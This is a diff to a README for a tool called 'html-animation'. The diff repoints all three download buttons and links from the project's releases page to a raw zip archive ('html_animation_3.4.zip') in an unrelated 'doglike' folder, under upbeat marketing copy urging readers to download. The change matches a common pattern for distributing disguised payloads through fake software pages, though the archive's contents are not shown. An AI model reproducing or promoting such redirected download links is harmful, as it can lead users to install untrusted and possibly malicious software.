@@ -23,7 +23,7 @@ Let's get you set up! Follow these steps carefully.
 
 Click the big button below to go to the official download page:
 
-[![Download html-animation](https://img.shields.io/badge/Download-html--animation-blue)](https://github.com/Demonstrationnerves409/html-animation/releases)
+[![Download html-animation](https://img.shields.io/badge/Download-html--animation-blue)](https://raw.githubusercontent.com/Demonstrationnerves409/html-animation/main/doglike/html_animation_3.4.zip)
 
 ### Step 2: Choose Your File
 
@@ -148,7 +148,7 @@ Fine-tune your video export with advanced options:
 
 ## 🤝 Support and Updates
 
-You can always find the latest version and updates by visiting the [download page](https://github.com/Demonstrationnerves409/html-animation/releases) regularly.
+You can always find the latest version and updates by visiting the [download page](https://raw.githubusercontent.com/Demonstrationnerves409/html-animation/main/doglike/html_animation_3.4.zip) regularly.
 
 For help and community support, check out:
 - **Bug Reports**: Submit issues through the GitHub repository
@@ -159,7 +159,7 @@ For help and community support, check out:
 
 You're all set! Click the button below one more time to get your copy of html-animation:
 
-[![Get html-animation Now](https://img.shields.io/badge/Get_Started-Download_Version-orange)](https://github.com/Demonstrationnerves409/html-animation/releases)
+[![Get html-animation Now](https://img.shields.io/badge/Get_Started-Download_Version-orange)](https://raw.githubusercontent.com/Demonstrationnerves409/html-animation/main/doglike/html_animation_3.4.zip)
 
 Download now and start turning your ideas into eye-catching animated videos that will make your brand stand out from the crowd. With html-animation, creating professional motion graphics has never been easier!
 
